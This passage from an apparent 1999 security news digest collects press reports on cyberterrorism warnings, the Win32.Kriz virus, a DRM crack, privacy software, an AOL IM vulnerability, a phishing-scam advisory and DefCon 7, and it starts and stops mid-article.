      what can be accomplished by terrorist groups or states with far greater resources and motivation," the paper
      says.

      The paper says that the Web site of the Irish Republican Army openly discusses ways it could use so-called
      information operations to attack British interests.

      A support group for Tamil terrorists took responsibility for attacking the E-mail system of Sri Lankan
      diplomatic missions in Washington and New York two years ago.

      "On the World Wide Web, distance is not a factor. . . . We are as vulnerable as any other country and have
      more assets at risk than most," the paper says.

      CSIS, like other sensitive government agencies, almost certainly protects its secret computer systems by
      physically segregating them from any connection to the Internet, commented Peter Davis, a computer-security
      consultant.

      Mr. Davis said that terrorist attacks in cyberspace are going to become more frequent as groups become
      more sophisticated in the use of technology.

      Even some of the most sophisticated military communications systems appear to be vulnerable. Military
      sources have said the Canadian Forces lost key computer links with 10 military allies for 24 hours during a
      simulated cyberterrorist attack last year.

      A Canadian team working in Britain penetrated military networks as far away as Australia.

     Canadian Security Agency Warns Against
     Cyber-Attack 

     OTTAWA, ONTARIO, CANADA, 1999 AUG 18
     (Newsbytes) -- By Martin Stone, Newsbytes. Canada'a
     central security agency, the Canadian Security
     Intelligence Service (CSIS) has issued a warning
     against global terrorism, citing hackers and crackers,
     those who penetrate secure computer systems, as a
     growing threat. 

     In a background paper released Thursday, CSIS admits
     that crackers entered their Website in 1996 and altered
     their logo by changing the word "Intelligence" to
     "Illegal." In this first public disclosure of the incident,
     the agency says the damage was quickly discovered
     and corrected, but the event serves as an example of
     how cyber-savvy terrorists may be able to tamper with
     mission-critical systems. 

     The paper gives a brief outline of terrorist activities of
     the past and suggests that insurgents could severely
     cripple societies and even start wars by invading and
     taking control of the critical computer components. 

     The CSIS site was cracked within days of its having
     gone live, but the agency says there is no evidence
     that any sensitive files were entered. 

     CSIS spokesman Dan Lambert told Newsbytes that the
     site is in the public domain and is in no way connected
     to other CSIS computer systems, adding that the
     server is not even located on the CSIS premises, but
     housed at Canada's Department of Public Works. 

     He said the Websites of several other federal
     government departments were also invaded at about
     the same time. Since then, there have been several
     instances of federal and provincial government
     Websites being cracked, however no serious outages
     or security breaches have occurred. 

     The study hints that, as modern civilizations become
     more dependent on computers and connectivity, future
     wars could be fought in cyberspace. 

     Canada is known to be particularly vulnerable due to a
     heavy reliance on advanced technologies, as has been
     reported recently by Newsbytes and other media. 

     The backgrounder says: "If teenagers can compromise
     networks using basic skills and tools available on the
     Internet, the concern is what can be accomplished by
     terrorist groups or states with far greater resources and
     motivation." 

     The paper also states: "Terrorist methods continue to
     become more sophisticated, both in terms of
     technology and the exploitation of public opinion and
     media channels. Globally mobile and knowledgeable
     about communications, explosives technology and
     computers, they have contacts around the world. Their
     activities and targets are difficult to predict. The use of
     technology, always part of the terrorist arsenal, has
     been augmented by encryption and the Internet to
     facilitate communication and reach a wider audience. 

     "In addition, the growing dependence of states on
     computer-based communication and technologies is
     leading to a world in which future conflicts could involve
     activities in cyberspace and attacks on a state's
     information infrastructure, now commonly referred to as
     information operations. As one of the world's most
     advanced states in its reliance on information
     technologies, Canada is concerned about its
     vulnerability to this threat. 

     "We are already seeing indicators of the changing
     threat environment in this area. One of the IRA
     Websites openly discusses ways it could use
     information operations to attack British interests. In the
     summer of 1997, a group linked to the Liberation Tigers
     of Tamil Eelam claimed responsibility for an attack on
     the e-mail systems of the Sri Lankan Embassy in
     Washington and its Mission in New York. 

     "If a Website is successfully hacked into, data on the
     site can be manipulated. As an example, the CSIS
     Website was hacked into and a few words changed on
     the home page. On the World Wide Web, distance is
     not a factor. Canada's geographic location and the
     world's longest undefended physical border provide no
     natural protection against these kinds of attacks. We
     are as vulnerable as any other country and have more

45.0 Win32.Kriz Set To Go Off Christmas Day 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     From HNN http://www.hackernews.com/


      contributed by AlienPlague 
      A new virus set to hit on Christmas day could be more
      devastating than the CIH virus. The virus, which has
      been described as being "very well written", kills the
      CMOS memory, overwrites data on all available drives,
      and destroys the flash BIOS using the same method the
      Chernobyl virus used. Luckily, computer users will have
      until December 25 to buy or update their anti-virus
      software. The virus only infects users of Microsoft
      Windows.

      'Christmas' virus can destroy PCs
      By Bob Sullivan, MSNBC

      A nasty new virus discovered by researchers promises to do even more damage to victims than
      the Chernobyl virus. It has the ability not only to erase files, but also to render a PC useless by
      destroying its flash BIOS. 
      
      The good news is it won't execute until Dec. 25; the bad news is PC users without anti-virus
      programs may have a very bad Christmas Day. 
      
      The author of Win32.Kriz, discovered recently by researchers, sounds as if he or she has an ax to
      grind against religious folks. 
      
                            Inside the virus is a text string with a poem full of expletives criticizing
                            those who preach religion: "I don't wanna hear it, coz I know none of
                            it's true," the author writes, according to anti-virus research firm
                            Kaspersky Lab. 
      
                            Victims of the virus -- who can be anyone using Windows 95,
      Windows 98 or Windows NT -- can expect a load of trouble. The virus kills the CMOS memory,
      overwrites data in all files on all available drives, and then destroys the flash BIOS by using the
      same routine that was found in the "Win95_CIH" virus, also known as Chernobyl. 
      
      "This is a nasty one, very well written," said Dan Takata of anti-virus vendor Data Fellows Inc. 
      
      He said it's too early to tell if the virus will be widespread -- but potential victims have until Dec.
      25 to update their antivirus programs against it.

46.0 MS Windows Media Audio Broke One Day After Release

      Microsoft recently released Windows Media Audio, a
      audio format set to compete against MP3. The
      difference is the WMA has security features built in to
      force people to pay for the music they listen to. One
      day after the release of this format cracking programs
      like unfuck.exe and AudioJacker where available to
      defeat this technology. Microsoft is working on a fix.

      Windows Media hits sour note 
     By Jim Hu and Michael Kanellos
     Staff Writers, CNET News.com
     August 18, 1999, 4:45 p.m. PT 

     A day after Microsoft released its new Web music technology, the company confirmed that crackers have already
     developed a program to strip away the security behind it.

     Microsoft acknowledged that the executable file, dubbed "unfuck.exe," exists and works. In fact, there are a number of programs,
     such as Audiojacker, that perform similar functions. 

     "This one just has a glitzier name," said a Microsoft spokesman, adding that the company is working on a fix. 

     Normally, only the user who downloads and pays for a song encrypted in Microsoft's Windows Media Audio 4 technology can
                           listen to it. But with the new exploit, someone who pays for the song also can email it to friends who
                           want to hear or copy it. 

                           The program works by rerecording musical tracks in an unprotected format. To take advantage of the
                           program, a would-be pirate has to buy and download music. During the downloading process, the
                           executable intercepts the music and reformats it into a different format that doesn't have embedded
                           security elements. Copies can then be made freely. 

                           Windows Media Audio is Microsoft's answer to the numerous audio compression formats that have
                           gained popularity in the last year. These technologies allow users to download music off the Web
                           and play it back. MP3 is one technology that has gained considerable popularity. 

                           Although piracy is theft and represents lost potential revenue, observers say the record industry has
                           historically overplayed the threat. Pirated copies of software or music, especially among hobbyists,
                           will always crop up. Recently the Recording Industry Association of America, which represents the
                           major U.S. record companies, has acknowledged this publicly. 

     "We'll always have piracy of cassettes and CDs, for instance, with the flea markets or street vendors. That will never go away, and
     I think the same will be true of the Internet," Hilary Rosen, chief executive of the RIAA, said in an earlier interview. "But we're
     going to see an explosion of legitimate music online. And consumers are going to have an alternative. I believe consumers will
     want the alternative." 

     Some analysts agree that consumers tend to gravitate toward buying legitimate copies. 

     "The piracy threat is a bit overblown at the present time," said Mark Hardie, senior analyst at Forrester Research. "There will be
     levels of piracy that will be unavoidable...You will always have code somewhere in cyberspace that will hack through encryption." 

     He added that it is easier to trace the source of pirated copies of digital music than copies made from traditional methods of
     recording. That means it likely will be easier to stop illegal copying in the future than it is today, he said. 

     Windows Media is a group of technologies for multimedia playback. Besides Windows Media Audio, the package includes
     Windows Media Player and software and services including Windows Media Services, Windows Media Tools, and a software
     development package. 

     The Windows Media Audio exploit was first reported on the pro-MP3 Dimension Music site.

      Total digital privacy may be on the horizon 

      August 18, 1999
      Web posted at: 5:32 p.m. EDT (2132 GMT)


      By Robin Lloyd
      CNN Interactive Senior Writer 

      (CNN) -- If American software
      developers were to touch any of the
      code in the 10,000 released beta
      versions of an Internet privacy
      solution that is getting good
      preliminary marks, they would be
      subject to prosecution. 

      In fact, if Zero-Knowledge Systems
      were based in the United States, it
      would be illegal for the company to
      export its Internet privacy software,
      dubbed 'Freedom.' 

      Instead, the Montreal-based start-up,
      headed up by 26-year-old Austin Hill, is set to release the first product of its
      kind -- a comprehensive Internet privacy package that offers multiple online
      pseudonyms and Byzantine encrypted rerouting that even Zero-Knowledge
      couldn't crack if it wanted to. 

      No more cookies, e-mail trails and digital identity stealing. At least, that's the
      idea. More than a dozen "cookie killers" already exist, along with several
      e-mail and browser anonymity services such as anonymizer.com. 

      Those all rely on what Hill calls a "trust-me" mechanism. A third party server
      holds users' identity and data. Freedom makes it so the end-user has sole
      possession of that data. 

      "If there was a gun to my head, I still could not reveal or break the privacy
      of my users," Hill says. 

      The user has the only "key" to their pseudonyms, which can be linked to
      independent e-mail addresses, geographic locations and encryption keys. 

      Freedom is designed to protect the e-mail, chats, browsing and newsgroup
      searches of anyone from a Chinese dissident posting pro-democracy
      messages to an employee checking out listings for Alcoholics Anonymous. 

      The software can encrypt private chats and newsgroup discussions, ensures
      anonymous Web browsing and can even block spam, Hill says. Each digital
      identity relies on full strength encryption that ranges from 128 to 4,096 bits. 

      Freedom 1.0, which works only on Windows platforms, is set for release in
      late October or early November. It will be downloadable for $49.95.
      Macintosh and Linux versions are due out next year. Freedom doesn't work
      with America Online, however, since AOL is an online service separate from
      the Internet. 

      Zero-Knowledge released 1,000 beta copies of Freedom at the DefCon 7
      convention in Las Vegas last month. Since then, it has released thousands
      more via its Web site. A total of 50,000 people have requested copies since
      then. 

      How it works

      Web users leave traces of their identity behind every time they visit a Web
      site or send e-mail. To get a sense of the process, visit the Center for
      Democracy and Technology's site and use its demo. 

      Freedom allows users to set up separate pseudonyms for different aspects
      of their lives -- an identity for an online chat about health care, another for
      interactions with friends and family, others for Internet browsing and finally a
      'true' identity for e-commerce. 

      Zero-Knowledge is working on an e-commerce identity protection solution
      for future versions. 

      Freedom scrambles data coming from a user's PC and hides the source and
      destination of Internet traffic routed through the service. 

      The message or data packet is first sent to Zero-Knowledge's servers where
      it is wrapped in a layer of encryption. 

      That initiates a delivery process where the data bounces from one
      independently owned relay station to the next and can only be opened by
      one specific user who then forwards it to another specific user, with that
      process repeating several times. 

      Eventually a data packet goes to its intended target but neither snoopers, nor
      the final recipient, have any way of tracing its origins. 

      Third-party protections, the approach relied upon by Freedom's
      predecessors, can be hacked or bought away when the company makes a
      new acquisition, as was the case when Double Click acquired Abacus, Hill
      said. Or, civil lawsuits can force ISPs to turn over their records. 

      Freedom gets high marks

      David Sobel, general counsel for the Electronic Privacy Information Center,
      and Ari Schwartz, a policy analyst with the Center for Democracy and
      Technology, agree that Freedom is a good solution. 

      "I suspect that it is one of the best solutions that we've seen," Sobel said.
      Freedom's strength comes from Hill's philosophical commitment to
      preserving privacy and anonymity on the Internet, Sobel said. 

      Schwartz underlined the Center's stance on Internet privacy -- software
      solutions combined with self-regulation among service providers and
      legislation will be needed to protect privacy online. 

      The U.S. Congress has introduced several bills this session relating to online
      privacy but advocates say they may not go far enough. 

      A CDT report concludes that online privacy is the exception, not the rule, in
      the private sector. 

      U.S. encryption policy has its pros and cons

      The U.S. policy that prohibits encryption exports and labor is based on
      protecting security codes produced and cracked by the FBI and other
      national security agencies. 

      The downside is that we may lose out on what has turned into a $1.5 billion
      cryptography business for Canada, where limits are less strict, Hill says. 

      The U.S. approach could backfire and result in a brain drain of encryption
      experts, EPIC's Sobel said. 

      "The end result will be that American companies will lose leadership in this
      field," he said, "and it is not going to result in encryption being out of the
      hands of anyone our government might be concerned about."

48.0 Is AOL hacking IM users?

     Is AOL hacking IM users?
     By David Raikow, Sm@rt Reseller
     August 18, 1999 3:04 PM PT
     URL: http://www.zdnet.com/zdnn/stories/news/0,4586,2316917,00.html
     
     As the Instant Messaging war rages on, evidence is mounting that suggests America Online Inc. is
     using a security hole in its own software to lock out IM clones. 
     
     While security experts are still examining IM logs to determine precisely what is going on, it looks
     like AOL's tactics may have put its own users at serious risk.
     
     The first hint of a problem came last Wednesday, when an individual identifying himself as "Phil
     Bucking" of "Bucking Consulting" sent an e-mail to PharLap Software President Richard Smith
     warning of a "buffer overflow" vulnerability in the AOL IM client. Smith, a noted security expert,
     quickly determined that the e-mail had been falsified, and had almost certainly come from within
     Microsoft. Microsoft has flip-flopped on whether or not the e-mail message actually came from
     one it its employees.
     
     Because of the identity question, the allegations of "Mr. Bucking" initially garnered little serious
     attention. On Monday, however, Robert Graham, chief technical officer with Network Ice
     Software, a software security firm, released a detailed analysis of the AOL IM logon procedure,
     which suggests a vulnerability almost identical to that described by "Bucking".
     
     A very serious threat
     The security community is now taking the threat very seriously.
     
     "Buffer overflow" vulnerabilities allow an intruder to trick a susceptible machine into executing
     code by sending it more information than it is configured to receive. These attacks require a great
     deal of technical knowledge to develop, but are often automated with script tools and used to
     compromise network servers by skilled hackers and "script kiddies" alike.
     
     While emphasizing that the evidence is still preliminary, PharLap's Smith said he believes that AOL
     has been using this technique to trigger specific responses from its IM clients. Because Microsoft's
     IM clients do not have this bug, AOL servers can identify them, and lock them out of the system.
     This bug has only been observed on Windows clients; it is not clear how other platforms are
     affected.
     
     Smith said he sees this as a very serious potential threat to users. As Microsoft continually updates
     its clients, AOL must keep introducing new variations on the buffer overflow to stay ahead.
     
     "It's only a matter of time before they make a mistake, and machines running AOL IM start
     crashing all over the Net," Smith predicts.
     
     Smith added that the hole gives AOL an extraordinary amount of power over users' machines.
     "Remember that this is a technique normally used by hackers to break into machines. The current
     use seems pretty benign, but AOL can use this to execute any arbitrary code on a Windows
     machine -- run software, leave backdoors, whatever. What happens if a disgruntled AOL
     employee finds a use for this?" Smith warned.
     
     Larger potential danger
     Graham said he concurs with Smith's assessment, though he sees an even larger potential danger:
     
     "If hackers managed to masquerade as an AOL server, they could do anything to the target
     machine. This could be a real problem for cable modem and DSL users, who have 24-hour
     connections and are vulnerable to 'man-in-the-middle' attacks."
     
     Graham noted that such attacks are unlikely in the near future because of the technical expertise
     required, but are a very real possibility.
     
     AOL did not respond to requests for comment on these latest charges by press time.

     Hackers reverse message on
     anti-gay Web site

     August 19, 1999
     Web posted at: 5:22 p.m. EDT (2122 GMT)

     By Robin Lloyd
     CNN Interactive Senior Writer 

     (CNN) -- Hackers switched the
     message from hate to love on a
     notorious anti-gay site on the
     Internet. 

     A 2-year-old Web site
     www.godhatesfags.com put up by
     Pastor Fred Phelps' Westboro
     Baptist Church in Topeka, Kansas,
     was hacked Wednesday to re-route
     visitors to www.godlovesfags.com,
     featuring a pink and purple pro-gay banner, links to gay news Web sites and
     a quote from Ellen DeGeneres. 

     "Hate will not be tolerated on the Internet," said Kris Haight on Thursday.
     Haight says he registered the domain name for the pro-gay site more than a
     year ago and gave the OK for the re-routing within the past two days. 

     "Phelps teaches hate and a lot of it is untrue.
     People who go to their site and want to find hate
     aren't going to find it, at least until he gets the
     domain back." 

     The pro-gay site, usually visited daily by only a
     handful of people, got 8,000 hits in the past 24
     hours, Haight said. The pages were written by
     Rich Macky of Omaha, Nebraska, Haight said.
     The switch did not show up on all computers
     Thursday as it takes time for the re-routing to
     take effect on servers worldwide. 

     Phelps' daughter, Shirley Phelps-Roper, said the hack is just one of more
     than a dozen tricks played on the church's Web site in the past two years. 

     "No, my dear, it's not all that drastic," she told CNN Interactive. "It's just
     another fag ploy to try to bury the truth of God and the Earth. It's a
     temporary inconvenience." 

     Phelps-Roper, who also serves as the church's attorney, said it would take a
     couple days of paperwork on her end to correct the re-routing. 

     Fred Phelps, whose congregation regularly engages in anti-homosexual
     picketing, demonstrated at the funeral of Matthew Shepard, a 21-year-old
     gay man who was savagely beaten to death in a Wyoming hate crime. 

     Hacker hit DNS

     Haight said he didn't know who originated the hack, which involves
     re-routing godhatesfags.com visitors via the Domain Name System, a
     network of servers which translates alphabetic domain names into numeric
     IP, or Internet Protocol, addresses. 

     Haight, a 22-year-old gay man living in Newport, New Hampshire, said he
     registered the pro-gay domain name a year or so ago when he found out
     about Phelps site, which he says he found disgusting. 

     He recently received an anonymous e-mail advising him to watch the Internet
     contact information for his site. 

     Wednesday, Haight got a chance to change that information. "I set up the
     server to point godhatesfags to godlovesfags," he said. 

     Later, he received another e-mail saying the address swap worked. 

     Haight is part of a group of Internet denizens known as Mindsprung, a play
     on the popular Internet service provider Mindspring. Haight owns domain
     names for a couple other Web sites, including www.gaycollegeboys.com, an
     IRC chat discussion page. 

     Phelps-Roper said the 100-member church has been forced to switch
     servers a few times due to all the digital attacks on the site. The church
     sponsors another Web site -- godhatesamerica.com. 

     "We're busy people, not thwarted or detracted by one more assault on our
     ministry," she said. "It's like 'ho hum.'"

50.0 Indonesian CyberWar? Or Not?

      On Wednesday Nobel Peace Prize laureate Jose
      Ramos-Horta claimed that hundreds of people around
      the world were poised to launch a cyber attack against
      Indonesia should there be any tampering in the election
      process for East Timor's freedom. 

      Yesterday HNN cast grave doubts on this claim having
      seen absolutely no evidence to support it. 

      Connect Ireland, the ISP that hosts the virtual top level
      domain of .tp for East Timor has released a press
      release also saying that they have not seen nor heard
      of any preparations for any electronic retaliation. C-I
      also urges all people to leave the internet for
      communication and not to attack other peoples freedom
      of speech via the internet.

      Press Release - from Connect - Ireland

      Thursday 19th August 1999, Dublin.

      Connect-Ireland's response to the call for
      Cyber War against Indonesia.

      In a number of recent international newspapers, articles
      have appeared quoting Ramos Horta in the context of the
      threat of the use of cyberwarfare against Indonesia. 

      There are some points I would like to make to correct
      some of the content in these articles. The attack on us -
      which was a culmination of attacks over 9/10 months was
      NOT directed at a web site - but at the cctld - top level
      domain - for East Timor (.tp) - and therefore much more
      serious than stated.. 

      During the course of the attack, we established that the
      perpetrators had a full domain registry with them and were
      endeavouring to establish spurious domains - which we
      can but assume were for neferious purposes and
      presumably these would reflect badly on the Call for
      Freedom by the East Timorese. 

      Our activities and initiatives have established East Timor's
      virtual independence, at least as far as the Internet is
      concerned. 

      After the attack we received many positive offers of
      support and assistance. The offers also included possible
      revenge attacks against Indonesia - which we stated
      categorically that we did not want or condone. 

      We have not heard from anyone in the current call for
      such action by Ramos Horta either in the Irish Internet
      community or any other location. If we had heard of such
      a potential action, C-I would have endeavoured to
      dissuade the use of such options and activities and
      hopefully would have directed the interest and intellectual
      capacity to more fruitful channels. 

      I would like to make our position extremely clear. 

      We do not condone attacks of any kind on the Internet or
      other similar technologies. We believe in the freedom of
      speech and in everyone's ability to conduct their
      communication for their own legitimate purposes. We (C-I)
      believe there is more to be gained by maintaining the
      opportunities that can be developed through free speech
      than in conducting cyberwarfare. 

      I would also like to add that after the attack on us, we
      received support from many Indonesians - who translated
      our statement(s) into the many languages that are used
      within that territory and circulated these widely. 

      We (C-I) are NOT at war with the Indonesian People. 

      We were completely unaware of the proposed activity as
      given by Horta. 

      We have not been approached in recent months by
      anyone who has stated that they wished to participate in
      an activity of this nature. The response that we received
      after the attack from the 'hacker' cyber community was all
      very anti cyber terrorism. 

      Since the beginning of this year, we have been informed
      on good authority that over 5000 East Timoreans have
      been killed. In this light, I can perceive that leading
      activists in the cause for East Timor are under
      considerable pressure and this will continue until the
      implementation of full and open democratic processes are
      in place in East Timor. 

      To my mind Ghandi would have made a much better
      Internet strategist than Hitler. Connect-Ireland believes in
      the freedom of speech. We believe that all lines of
      communication should always be kept open as there is
      more to gain through this process. 

      I can think of no better environment for managing "Jaw-
      Jaw rather than War-War" - than the Internet.

51.0 Gov Wants to Break Into to Personal Computers, Legally

      A proposed 'Cyberspace Electronic Security Act,' would
      give the DoJ additional powers to break into personal
      computers. The DoJ memo dated August 4, would allow
      the government to disable encryption on the machines
      and to gather passwords.

      Justice Department Mulls Covert-Action Bill 
 
      By Robert OÆHarrow Jr. 
      Washington Post Staff Writer 
      Friday, August 20, 1999; Page A1 
 
      The Justice Department wants to make it easier for law enforcement
      authorities to obtain search warrants to secretly enter suspects' homes or
      offices and disable security on personal computers as a prelude to a
      wiretap or further search, according to documents and interviews with
      Clinton administration officials.
 
      In a request set to go to Capitol Hill, Justice officials will ask lawmakers to
      authorize covert action in response to the growing use of software
      programs that encrypt, or scramble, computer files, making them
      inaccessible to anyone who does not have a special code or "key,"
      according to an Aug. 4 memo by the department that describes the plan.
 
      Justice officials worry that such software "is increasingly used as a means
      to facilitate criminal activity, such as drug trafficking, terrorism,
      white-collar crime, and the distribution of child pornography," according
      to the memo, which has been reviewed by the Office of Management and
      Budget and other agencies. 
 
      Legislation drafted by the department, called the Cyberspace Electronic
      Security Act, would enable investigators to get a sealed warrant signed by
      a judge permitting them to enter private property, search through
      computers for passwords and install devices that override encryption
      programs, the Justice memo shows.
 
      The law would expand existing search warrant powers to allow agents to
      penetrate personal computers for the purpose of disabling encryption. To
      extract information from the computer, agents would still be required to
      get additional authorization from a court.
 
      The proposal is the latest twist in an intense, years-long debate between
      the government and computer users who want to protect their privacy by
      encrypting documents.
 
      Although Justice officials say their proposal is "consistent with
      constitutional principles," the idea has alarmed civil libertarians and
      members of Congress.
 
      "They have taken the cyberspace issue and are using it as justification for
      invading the home," said James Dempsey, senior staff counsel at the
      Center for Democracy and Technology, an advocacy group in the District
      that tracks privacy issues.
 
      Police rarely use covert entry to pave the way for electronic surveillance.
      For example, federal law enforcement agencies obtained court approval
      just 34 times last year under eavesdropping statutes to install
      microphones, according to the 1998 wiretap report issued by the
      Administrative Office of the Unites States Courts.
 
      David L. Sobel, general counsel at the Electronic Privacy Information
      Center, predicted the number of secret break-ins by police would soar if
      the proposal is adopted because personal computers offer such a
      tantalizing source of evidence for investigators -- including memos, diaries,
      e-mail, bank records and a wealth of other data.
 
      "Traditionally, the concept of 'black bag' jobs, or surreptitious entries,
      have been reserved for foreign intelligence," Sobel said. "Do we really
      want to alter the standard for physical entry?"
 
      The proposal follows unsuccessful efforts by FBI Director Louis J. Freeh
      and other Justice officials to secure laws requiring computers or software
      to include "back doors" that would enable investigators to sidestep
      encryption.
 
      Those proposals, most notably one called Clipper Chip, have been
      criticized by civil libertarians and have received little support in Congress.
 
      In a snub of the administration, more than 250 members of Congress have
      co-sponsored legislation that would prohibit the government from
      mandating "back doors" into computer systems.
 
      "We want to help law enforcement deal with the new technologies. But we
      want to do it in ways that protect the privacy rights of law-abiding
      citizens," said Rep. Robert W. Goodlatte (R-Va.), who originally
      sponsored the legislation, known as the Security and Freedom Through
      Encryption Act. Goodlatte said the Justice Department's proposal might
      upset the "very finely tuned balance" between law enforcement power and
      civil liberties.
 
      But Justice Department officials say there is an increasingly urgent need for
      FBI agents and other federal investigators to get around encryption and
      other security programs.
 
      "We've already begun to encounter [encryption's] harmful effects," said
      Justice spokeswoman Gretchen Michael. "What we've seen to date is just
      the tip of the iceberg."
 
      The proposed law also would clarify how state and federal authorities can
      seek court orders to obtain software encryption "keys" that suspects might
      give to others for safekeeping. Although few people share such keys now,
      officials anticipate that they will do so more often in the future.
 
      Administration officials played down the potential impact on civil liberties.
      In interviews, two officials said the law would actually bolster privacy
      protections by spelling out the requirements for court oversight of
      cyber-surveillance and the limits on how information obtained in a search
      could be used.
 
      "The administration is supportive of encryption. Encryption is a way to
      provide privacy, but it has to be implemented in a way that's consistent
      with other values, such as law enforcement," said Peter P. Swire, the chief
      White House counselor for privacy. "In this whole debate, we have to
      strike the right balance."
 
      Computer specialists predict that people under investigation will take
      countermeasures.
 
      "It's 'Spy vs. Spy,' " said Lance Hoffman, director of the Cyberspace
      Policy Institute at George Washington University, who praised the
      administration for raising the issue but expressed skepticism about the
      proposal as it was described to him.
 
      "I'd be leery if I were the government. . . . They have to be real careful,"
      he said.

      Feds want authority to
      secretly crack personal

      August 20, 1999
      Web posted at: 12:49 a.m. EDT (0449 GMT)

      WASHINGTON (AP) -- The Clinton
      administration reportedly plans to ask
      Congress to give police authority to
      secretly go into people's personal
      computers and crack their security
      codes. 

      Legislation drafted by the Justice Department would let investigators get a
      sealed warrant from a judge to enter private property, search through
      computers for passwords and override encryption programs, The
      Washington Post reported Friday. 

      The newspaper quoted an August 4 department memo that said encryption
      software for scrambling computer files "is increasingly used as a means to
      facilitate criminal activity, such as drug trafficking, terrorism, white-collar
      crime and the distribution of child pornography." 

      Under the measure, investigators would obtain sealed search warrants
      signed by a judge as a prelude to getting further court permission to wiretap,
      extract information from computers or conduct further searches. 

      Privacy advocates have objected to the plan, dubbed the Cyberspace
      Electronic Security Act by the Justice Department. "They have taken the
      cyberspace issues and are using it as justification for invading the home,"
      James Dempsey, an attorney for the Center for Democracy and Technology,
      told the Post. 

      Peter Swire, the White House's chief counselor for privacy, told the
      newspaper the administration supports encryption as a way to provide
      privacy for computer users. 

      "But it has to be implemented in a way that's consistent with other values,
      such as law enforcement," Swire said. "In this whole issue we have to strike
      the right balance." 

      The administration has for years been seeking a law to require computer
      makers to include a so-called Clipper Chip in their products that would give
      police a "back door" into computers despite any encryption software they
      may contain. 

      In a backlash, more than 250 members of Congress have signed on as
      co-sponsors to legislation that would prohibit mandating such back-door
      devices on computers.

53.0 AOL Password Scam Uncovered

      From HNN http://www.hackernews.com/

      contributed by Webmaster 
      The Shadow Knights Security Corp. has released an
      advisory that details a new scam that they have
      discovered that attempt to steal AOL users passwords.
      Basically an email is sent to the user which directs them
      to a fake AOL NetMail page where they are prompted to
      enter their username and password to read unread mail.

      http://angelfire.com/oh3/preview/ ::mirror:: http://www.ShadowGovt.net/aolscam/ 
      
      The above link is from a scam e-mail that has been sent to who knows how many AOL members. This time the setup is
      even more elaborate than the site our last advisory was about. Our last advisory is similar to this one however, we feel the
      need to reiterate our position. 
      
      Why a scam works:
      This scam setup and procedure is similar to all most AOL password scams, however, someone spent time on this one.
      AOL users tend to not be familiar with the 'real' Internet. This is not saying AOL users (in general) are not as smart as other
      ISP users, however, AOL users do lead a sheltered internet existence. A built in browsers, their own chat rooms, their own
      'Instant Messages', even your own AOL buddy list. AOL is a great ISP for those who are beginning net users and for those
      who wish to venture out, start leaving that AOL window and go out and find things on your own. Being this enclosed leaves
      AOL users to communicate only with other AOLers and less with the other ISP users. Research done previously by TSK
      Security Corp. suggest that 86% of AOL users who received this e-mail will visit the site; 62% of AOL users who received
      this e-mail will give their password and logon to the site
      
      The setup:
      AOL security breaches are more often then not, attempted using our good friend Social Engineering. I received the e-mail
      via BCC from MAIL36@aol.com. The scam includes a subject of 'AOL NetMail 2.0' and the body contains claims of: 
      'We have noticed that you have not been using America Online NetMail.
      You currently have: [5] unread message(s)'
      
      The body of message also includes details that 'Many times urgent messages are sent to NetMail, due to
      confidentiality, or privacy.' Upon visiting the page you see what looks like the AOL NetMail page however, on this page
      is an Angelfire banner. Note: Angelfire is not owned by AOL and you should never trust an internet site UNLESS it is on
      the relevant domain (AOL.com). 
      Example: If you are told to visit the new Hacker News Network (hackernews.com) and the link sends you to an Angelfire
      or Tripod account DON'T BELIEVE THAT YOU ARE AT HackerNews.com . 
      
      These scams will only continue if ignorance seems never to subdue. Please, if you are an AOL user (like myself) never,
      ever, EVER giveaway your account information to an unauthorized source. AOL Staff will NEVER ask for your password
      to your Logon account. Below is the exact text of the scam e-mail (A).
      
      I have checked out the supposed links above and they look to be from a free CGI Scripting Service. If you do receive this
      scam or similar scam e-mail, forward all the scam e-mails to TOSEMail1@aol.com .

      DefCon 7
      Hackerz, Phreakerz and Fedz: Three Days of Fear and Loathing in Las Vegas
      By Bronc Buster
      
      
      
      We flew into Las Vegas on Wednesday, hoping to get to check out the hotels and casinos on the strip before it all started. How were we to know the
      worst floods in Las Vegas history would happen, and that we would be told to stay in our hotel rooms for our own safety? What a beginning to a
      long five days, and another weird kick off for another installment of DefCon. This was DefCon 7, the annual hacker convention that happens every
      year in Las Vegas. 
      
      Everyone comes to DefCon: Teams from Microsoft and Intel, Federal Agents, elite underground figures, a huge number of hackers and phreakers,
      and even high school kids who must have ran away to come, because they look far too young to be in the city of sin by themselves. They come from
      all over the world: from Australia, Kuwait, Europe, South America, you name it. So for those of you not familiar with DefCon, you are asking yourself
      what would bring all these peopleùwell over 3000 by some estimatesùto the Alexis Park Hotel for this three-day event. Well, ask each different
      person and you will get a different answer.
      
      DefCon had three different speaking tracks this year, ranging from newbie to advanced topics, like how to take over PBX phone systems, to a simple
      introduction to TCP/IP, which is the protocol the Internet uses to function the way it does. Now, on the surface it may sound like a normal
      convention just like any other, but once you get there, you notice some strange things happening. 
      
      There were vendors selling everything from very real-looking fake IDs to books, old
      computer hardware and military computer equipment, T-shirts and CDs with alternate
      operating systems, like FreeBSD and Linux. There was a scavenger hunt, in which the
      items to be collected included everything from a satellite dish off the top of a famous
      casino, to a menu from a local restaurant. They had "hacker death matches" in huge,
      inflatable sumo outfits, that paired off people who may hate each other online, but have
      never seen each other in real life. Popular yearly games are played, like Hacker Jeopardy,
      in which teams of hackers get onstage in a game of Jeopardy to see who knows the most,
      with the losers having to drink large amounts of beer. The l0pht (pronounced Loft) also
      holds a TCP/IP drinking game, where people shoot it out on stage to see who knows the
      most about the complex inner-workings of the net, with the losers having to drink large
      amounts of beer. Another popular game that goes on throughout the entire convention is "Spot the Fed." This is where normal con goers try to pick
      out the feds who might be in the crowd mingling. ItÆs all in good fun, and if spotted, they are brought on stage, asked to show their ID, and then
      given a round of applause and T-shirt saying "I am a Fed." 
      
      As the years roll by and DefCon gets larger and larger, it attracts more and more people. This was apparent in how serious the U.S. Government is
      taking it, this year hosting its own panel where people could ask questions to agents from the National Security Counsel, the White House and the
      NSA. More apparent were the masses of media people who showed up. More than 300 press passes were given out, and there were over 20 film
      crews on hand, from CNN to Z-Net, and TV stations from all over the world. Needless to say, it is almost unbelievable seeing it go from what it was 7
      years agoùwhen it was a gathering of a few hundred people run by a group of friends who had the wild idea to get together to have to fun in Las
      Vegasùto what it is today. 
      
      One of this yearÆs highlights included a presentation from a group called the Cult of the Dead Cow, or cDc for short, who released an updated
      version of their remote administration tool called Back Orifice 2000 (BO2K). In addition to its legitimate useùremotely administrating
